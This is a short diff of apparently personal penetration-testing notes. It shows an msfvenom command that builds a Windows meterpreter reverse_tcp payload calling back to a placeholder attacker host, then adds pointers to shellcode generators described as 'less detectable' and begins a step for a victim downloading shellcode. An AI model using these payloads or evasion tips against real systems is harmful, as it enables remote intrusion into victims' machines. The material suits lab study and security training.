@@ -82,6 +82,11 @@ Russell:
   To create a payload (using kali):
             
       $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0\x0C\x0D"
+
+  An alternative would be to check out www.exploit-db.com/shellcodes/ for people who create their own shellcode generators. 
+      These can be less detectable
+  Here's one i found:
+  https://github.com/senzee1984/micr0_shell
       
   To download the shellcode as a victim via web server:
     
